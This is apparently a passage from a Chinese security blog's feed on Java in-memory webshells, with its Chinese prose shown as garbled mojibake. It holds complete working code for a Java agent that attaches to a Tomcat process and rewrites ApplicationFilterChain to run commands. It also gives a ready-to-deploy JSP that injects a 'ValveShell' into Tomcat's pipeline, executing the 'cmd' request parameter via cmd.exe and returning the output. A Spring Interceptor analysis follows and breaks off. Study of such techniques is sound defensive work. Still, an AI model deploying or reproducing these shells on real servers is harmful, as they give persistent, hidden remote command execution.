output.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                &#125; catch (IOException e) &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    throw new RuntimeException(e);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                response.setContentType(\&quot;text/html;charset=GBK\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                response.getWriter().println(output);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            &#125; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &#125;&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤–ï¼Œæƒ³è¦åŠ¨æ€åŠ è½½agentï¼Œéœ€è¦çŸ¥é“å½“å‰æœåŠ¡å™¨è¿è¡Œçš„PIDï¼Œå‰é¢ç”±äºåœ¨æœ¬æœºä¸Šæˆ‘ç›´æ¥é€šè¿‡jpså‘½ä»¤å³å¯è·å–ï¼Œåœ¨æ”»å‡»è§’åº¦ä¸Šï¼Œåˆ™éœ€è¦è¿™ä¸ªjaråŒ…åœ¨è¿è¡Œæ—¶è‡ªåŠ¨æŸ¥æ‰¾æœåŠ¡å™¨è¿è¡Œçš„PIDå¹¶æ‰§è¡ŒåŠ è½½agentå‘½ä»¤</p><p>ä¸ºjaråŒ…å®šä¹‰ä¸€ä¸ªå…¥å£ç±»ï¼Œæ‰§è¡Œæ—¶è‡ªåŠ¨è¿è¡Œè¯¥æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”¨äºè·å–æœåŠ¡å™¨è¿›ç¨‹PIDå’ŒåŠ è½½agent</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Boot</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">pid</span> <span class="operator">=</span> getPID(<span class="string">&quot;org.apache.catalina.startup.Bootstrap&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jar</span> <span class="operator">=</span> getJar(Boot.class);</span><br><span class="line">        <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(pid);</span><br><span class="line">        vm.loadAgent(jar);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getJar</span><span class="params">(Class&lt;?&gt; clazz)</span>&#123;</span><br><span class="line">        <span class="type">ProtectionDomain</span> <span class="variable">domain</span> <span class="operator">=</span> clazz.getProtectionDomain();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">location</span> <span class="operator">=</span> domain.getCodeSource().getLocation();</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> location.getPath();</span><br><span class="line">        <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)&amp;&amp;path.startsWith(<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">            path =  path.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPID</span><span class="params">(String className)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;jps -l&quot;</span>);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (line.contains(className)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> line.split(<span class="string">&quot; &quot;</span>)[<span class="number">0</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦åœ¨MFæ–‡ä»¶ä¸­é…ç½®å…¥å£ç±»</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: Boot</span><br><span class="line">Agent-Class: Agent</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Can-Set-Native-Method-Prefix: true</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•åœ¨ç›®æ ‡æœºå™¨ä¸Šå¯»æ‰¾<code>org.apache.catalina.startup.Bootstrap</code>è¿›ç¨‹å·ï¼Œå¹¶è¯†åˆ«è‡ªå·±çš„è·¯å¾„ï¼Œä¹‹åé€šè¿‡PIDè·å–<code>VirtualMachine</code>å¯¹è±¡ï¼Œå°†è‡ªå·±çš„è·¯å¾„ä¹Ÿå°±æ˜¯agentè·¯å¾„è½½å…¥æœåŠ¡å™¨è¿›ç¨‹</p><p>å°†ç¨‹åºæ‰“åŒ…ï¼Œåœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»¥ä¸‹ä»£ç ï¼Œå³å¯é€šè¿‡ç¯¡æ”¹å†…å­˜ä¸­<code>ApplicationFilterChain</code>çš„å­—èŠ‚ç å®ç°å†…å­˜é©¬çš„æ•ˆæœ</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar path/to/agent.jar</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹</p><p><img src="/img/post/image-20260116215731267.png" alt="image-20260116215731267"></p>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat Valveå†…å­˜é©¬</title>
      <link href="/2026/01/15/Tomcat%20Valve%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2026/01/15/Tomcat%20Valve%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat-Valveå†…å­˜é©¬"><a href="#Tomcat-Valveå†…å­˜é©¬" class="headerlink" title="Tomcat Valveå†…å­˜é©¬"></a>Tomcat Valveå†…å­˜é©¬</h1><p>Valveæ˜¯Tomcat å®¹å™¨çš„ä¸“ç”¨è¯·æ±‚å¤„ç†æ‹¦æˆªå™¨ï¼Œèƒ½å¤Ÿå¯¹æµé‡è¿›è¡Œä¸€å®šæ“æ§</p><br/><h2 id="å…³äºValve"><a href="#å…³äºValve" class="headerlink" title="å…³äºValve"></a>å…³äºValve</h2><p>åœ¨TomcatæœåŠ¡å™¨ä¸­ï¼Œæµé‡ä¼šç»è½¬å¤šä¸ªå®¹å™¨ï¼Œå®¹å™¨å†…å…·æœ‰ä¸€æ¡ç®¡é“<code>Pipeline</code>ä¾›æµé‡ä¼ è¾“ï¼Œåœ¨è¯¥ç®¡é“ä¸­ï¼Œå¯ä»¥è®¾ç½®é˜€é—¨<code>Valve</code>å¯¹æµé‡è¿›è¡Œå¤„ç†ï¼Œç±»ä¼¼äºJavaEEä¸­çš„è¿‡æ»¤å™¨Filterï¼ŒValveé€šè¿‡<code>invoke()</code>æ–¹æ³•å¯¹æµé‡è¿›è¡Œç›¸åº”æ“ä½œ</p><p><img src="/img/post/IMyaJTVZlbgmWEc.jpg" alt="IMyaJTVZlbgmWEc"></p><p><code>Pipeline</code>æ¥å£ä¸­ï¼Œå…·æœ‰ä¸€ä¸ª<code>addValve()</code>æ–¹æ³•ç”¨äºæ·»åŠ è‡ªå®šä¹‰é˜€</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Pipeline</span> <span class="keyword">extends</span> <span class="title class_">Contained</span> &#123;</span><br><span class="line">    Valve <span class="title function_">getBasic</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setBasic</span><span class="params">(Valve var1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve var1)</span>;</span><br><span class="line"></span><br><span class="line">    Valve[] getValves();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">removeValve</span><span class="params">(Valve var1)</span>;</span><br><span class="line"></span><br><span class="line">    Valve <span class="title function_">getFirst</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">findNonAsyncValves</span><span class="params">(Set&lt;String&gt; var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› è€Œåªéœ€è¦è·å–ä¸€ä¸ªå®¹å™¨ï¼Œå‘å®¹å™¨ä¸­æ·»åŠ æˆ‘ä»¬å®šä¹‰çš„æ¶æ„Valveç±»å°±å¯ä»¥æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„é€»è¾‘ï¼ŒContextå®¹å™¨å½“ç„¶æ˜¯é¦–é€‰ï¼Œåœ¨å‰é¢<code>FIlter</code>ã€<code>Servlet</code>å†…å­˜é©¬çš„æ„å»ºä¸­æˆ‘ä»¬å¯ä»¥è½»æ¾åœ°è·å–Contextå®¹å™¨æ¥å£çš„å®ç°ç±»<code>StandardContext</code></p><br/><h2 id="æ„å»ºValveå†…å­˜é©¬"><a href="#æ„å»ºValveå†…å­˜é©¬" class="headerlink" title="æ„å»ºValveå†…å­˜é©¬"></a>æ„å»ºValveå†…å­˜é©¬</h2><p>ç»§æ‰¿<code>ValveBase</code>ç±»æ„å»ºæ¶æ„çš„Valveï¼Œé‡å†™<code>invoke()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ValveShell</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                ProcessBuilder processBuilder;</span><br><span class="line">                processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">                response.getWriter().println(output);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è·å–å½“å‰webåº”ç”¨çš„<code>StandardContext</code>ï¼Œå°†æ¶æ„é˜€æ³¨å…¥</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; servletContextClass =  servletContext.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> servletContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">trueApplicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">ApplicationContext</span>&gt; applicationContextClass = trueApplicationContext.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">trueStandardContext</span> <span class="operator">=</span> (StandardContext) standardContext.get(trueApplicationContext);</span><br><span class="line">trueStandardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">ValveShell</span>());</span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„jspæ–‡ä»¶</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ValveShell</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                ProcessBuilder processBuilder;</span><br><span class="line">                processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">                response.getWriter().println(output);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; servletContextClass =  servletContext.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> servletContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">trueApplicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">ApplicationContext</span>&gt; applicationContextClass = trueApplicationContext.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContext</span> <span class="operator">=</span> applicationContextClass.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">trueStandardContext</span> <span class="operator">=</span> (StandardContext) standardContext.get(trueApplicationContext);</span><br><span class="line">    trueStandardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">ValveShell</span>());</span><br><span class="line"></span><br><span class="line">    response.getWriter().write(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>Valveåœ¨æµé‡åˆ°è¾¾Contextå®¹å™¨å‰å°±å·²åœ¨å‘æŒ¥ä½œç”¨ï¼Œå…¶ä¼˜å…ˆçº§æ¯”<code>Filter</code>ã€<code>Servlet</code>ã€<code>Listener</code>å’ŒSpringæ¡†æ¶ä¸­çš„å†…å­˜é©¬éƒ½è¦é«˜</p><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Interceptorå†…å­˜é©¬</title>
      <link href="/2026/01/15/Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2026/01/15/Interceptor%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Interceptorå†…å­˜é©¬"><a href="#Interceptorå†…å­˜é©¬" class="headerlink" title="Interceptorå†…å­˜é©¬"></a>Interceptorå†…å­˜é©¬</h1><p>Interceptoræ‹¦æˆªå™¨æ˜¯Springæ¡†æ¶ä¸‹çš„ç»„ä»¶ï¼Œå…¶ä½œç”¨ç±»ä¼¼äºTomcatä¸­çš„Filterï¼ŒInterceptorå¯ä»¥è¯·æ±‚åˆ°è¾¾Controllerå‰è¿›è¡Œæ‹¦æˆªè¿›è¡Œç›¸åº”æ“ä½œ</p><br/><h2 id="Interceptoræ³¨å†Œæµç¨‹"><a href="#Interceptoræ³¨å†Œæµç¨‹" class="headerlink" title="Interceptoræ³¨å†Œæµç¨‹"></a>Interceptoræ³¨å†Œæµç¨‹</h2><p>åœ¨Interceptorè°ƒç”¨çš„ä¸Šå±‚æ–¹æ³•<code>doDispatch()</code>ä¸­ï¼Œ<code>mappedHandler</code>å˜é‡ä¸­çš„<code>interceptorList</code>å­—æ®µå°±å·²ç»å­˜å‚¨äº†æˆ‘ä»¬å®šä¹‰çš„Interceptoräº†ï¼Œå› æ­¤æ¥ä¸‹æ¥éœ€è¦æ‰¾åˆ°<code>interceptorList</code>å­—æ®µä½•æ—¶è¢«èµ‹å€¼</p><p><img src="/img/post/image-20260115003830705.png" alt="image-20260115003830705"></p><p>ç”±äº<code>interceptorList</code>å­—æ®µåœ¨<code>mappedHandler</code>ä¸­ï¼Œè¿½æº¯å‘ç°<code>mappedHandler</code>åœ¨<code>doDispatch()</code>æ–¹æ³•ä¸­è¢«<code>getHandler()</code>æ–¹æ³•ä½œä¸ºè¿”å›å€¼è¾“å‡º</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mappedHandler = getHandler(processedRequest);</span><br></pre></td></tr></table></figure><p>æ­¥å…¥è¯¥æ–¹æ³•ï¼Œè¿”å›å€¼<code>handler</code>åœ¨å¯¹<code>mapping</code>è°ƒç”¨<code>getHandler()</code>æ–¹æ³•æ—¶è¢«å®šä¹‰å’Œèµ‹å€¼</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> HandlerExecutionChain <span class="title function_">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.handlerMappings != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> (HandlerMapping mapping : <span class="built_in">this</span>.handlerMappings) &#123;</span><br><span class="line"><span class="type">HandlerExecutionChain</span> <span class="variable">handler</span> <span class="operator">=</span> mapping.getHandler(request);</span><br><span class="line"><span class="keyword">if</span> (handler != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°æŸä¸ªéå†å‡ºæ¥çš„<code>mapping</code>ä¸­å«æœ‰æ‹¦æˆªå™¨</p><p><img src="/img/post/image-20260115004936735.png" alt="image-20260115004936735"></p><p>è¯¥mappingçš„ç±»å‹æ˜¯ç¡®å®šçš„<code>RequestMappingHandlerMapping</code>ï¼Œæˆ–è®¸æˆ‘ä»¬å¯ä»¥ç›´æ¥ç¯¡æ”¹è¯¥ç±»çš„å­—æ®µï¼Œä½†æ˜¯ç°åœ¨è¿˜ä¸çŸ¥é“æ‹¦æˆªå™¨æ˜¯ä»<code>interceptors</code>å­—æ®µè¿˜æ˜¯<code>adaptedInterceptors</code>å­—æ®µè·å–çš„ï¼Œæ­¥å…¥<code>getHandler()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> HandlerExecutionChain <span class="title function_">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getHandlerInternal(request);</span><br><span class="line"><span class="keyword">if</span> (handler == <span class="literal">null</span>) &#123;</span><br><span class="line">handler = getDefaultHandler();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (handler == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Bean name or resolved handler?</span></span><br><span class="line"><span class="keyword">if</span> (handler <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">handlerName</span> <span class="operator">=</span> (String) handler;</span><br><span class="line">handler = obtainApplicationContext().getBean(handlerName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Ensure presence of cached lookupPath for interceptors and others</span></span><br><span class="line"><span class="keyword">if</span> (!ServletRequestPathUtils.hasCachedPath(request)) &#123;</span><br><span class="line">initLookupPath(request);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">HandlerExecutionChain</span> <span class="variable">executionChain</span> <span class="operator">=</span> getHandlerExecutionChain(handler, request);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">logger.trace(<span class="string">&quot;Mapped to &quot;</span> + handler);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (logger.isDebugEnabled() &amp;&amp; !DispatcherType.ASYNC.equals(request.getDispatcherType())) &#123;</span><br><span class="line">logger.debug(<span class="string">&quot;Mapped to &quot;</span> + executionChain.getHandler());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hasCorsConfigurationSource(handler) || CorsUtils.isPreFlightRequest(request)) &#123;</span><br><span class="line"><span class="type">CorsConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> getCorsConfiguration(handler, request);</span><br><span class="line"><span class="keyword">if</span> (getCorsConfigurationSource() != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="type">CorsConfiguration</span> <span class="variable">globalConfig</span> <span class="operator">=</span> getCorsConfigurationSource().getCorsConfiguration(request);</span><br><span class="line">config = (globalConfig != <span class="literal">null</span> ? globalConfig.combine(config) : config);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (config != <span class="literal">null</span>) &#123;</span><br><span class="line">config.validateAllowCredentials();</span><br><span class="line">&#125;</span><br><span class="line">executionChain = getCorsHandlerExecutionChain(request, executionChain, config);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> executionChain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•çš„è¿”å›å€¼<code>executionChain</code>åœ¨<code>getHandlerExecutionChain()</code>æ–¹æ³•è¢«åˆ›å»ºï¼ŒåŒæ—¶ä¹Ÿåœ¨è¯¥æ–¹æ³•è¢«èµ‹ç»™äº†æ‹¦æˆªå™¨<code>interceptorList</code>å­—æ®µ</p><p><img src="/img/post/image-20260115005802252.png" alt="image-20260115005802252"></p><p>æ­¥å…¥<code>getHandlerExecutionChain()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> HandlerExecutionChain <span class="title function_">getHandlerExecutionChain</span><span class="params">(Object handler, HttpServletRequest request)</span> &#123;</span><br><span class="line"><span class="type">HandlerExecutionChain</span> <span class="variable">chain</span> <span class="operator">=</span> (handler <span class="keyword">instanceof</span> HandlerExecutionChain ?</span><br><span class="line">(HandlerExecutionChain) handler : <span class="keyword">new</span> <span class="title class_">HandlerExecutionChain</span>(handler));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (HandlerInterceptor interceptor : <span class="built_in">this</span>.adaptedInterceptors) &#123;</span><br><span class="line"><span class="keyword">if</span> (interceptor <span class="keyword">instanceof</span> MappedInterceptor) &#123;</span><br><span class="line"><span class="type">MappedInterceptor</span> <span class="variable">mappedInterceptor</span> <span class="operator">=</span> (MappedInterceptor) interceptor;</span><br><span class="line"><span class="keyword">if</span> (mappedInterceptor.matches(request)) &#123;</span><br><span class="line">chain.addInterceptor(mappedInterceptor.getInterceptor());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">chain.addInterceptor(interceptor);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> chain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸éš¾å‘ç°ï¼Œ<code>chain</code>ä»<code>addInterceptor()</code>è·å–æ‹¦æˆªå™¨ï¼Œä¼ å…¥çš„æ‹¦æˆªå™¨ä»<code>adaptedInterceptors</code>å­—æ®µéå†å‡ºæ¥ï¼Œè¯¥å­—æ®µä¹Ÿå«æœ‰æˆ‘ä»¬å®šä¹‰çš„æ‹¦æˆªå™¨</p><p><img src="/img/post/image-20260115010242888.png" 